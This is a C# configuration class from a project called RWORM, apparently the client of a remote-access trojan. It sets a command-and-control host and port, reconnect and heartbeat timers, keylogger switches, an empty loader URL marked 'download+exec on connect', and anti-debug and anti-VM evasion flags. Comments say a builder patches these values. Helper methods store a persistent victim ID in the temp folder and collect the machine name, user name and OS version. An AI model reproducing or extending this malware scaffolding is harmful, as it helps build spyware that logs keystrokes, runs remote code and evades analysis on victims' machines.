using System;
using System.IO;

namespace RWORM.Client.Core
{
    public class Config
    {
        // ── C2 ───────────────────────────────────────────────────────────────
        public static string C2Host = "127.0.0.1";
        public static int    C2Port = 3333;
        public static int    ReconnectDelay  = 5000;
        public static int    ConnectTimeout  = 8000;
        public static int    HeartbeatInterval = 30000;

        // ── Keylogger ─────────────────────────────────────────────────────────
        // Builder patches these two lines by exact string replacement.
        public static bool   KeyloggerEnabled = false;
        public static bool   KeyloggerOnline  = false;   // false = offline mode

        // ── Task on connect ───────────────────────────────────────────────────
        // Builder patches these lines.
        public static bool   TaskEnabled   = false;
        public static string TaskLoaderUrl = "";          // URL to download+exec on connect

        // ── Evasion ───────────────────────────────────────────────────────────
        public static bool AntiDebug = false;
        public static bool AntiVM    = false;

        // ─────────────────────────────────────────────────────────────────────

        public static string GetGuid()
        {
            var path = Path.Combine(Path.GetTempPath(), "rworm.id");
            if (File.Exists(path)) return File.ReadAllText(path).Trim();
            var guid = Guid.NewGuid().ToString();
            try { File.WriteAllText(path, guid); } catch { }
            return guid;
        }

        public static string GetHostname()   => Environment.MachineName;
        public static string GetUsername()   => Environment.UserName;
        public static string GetOSVersion()  => Environment.OSVersion.ToString();
    }
}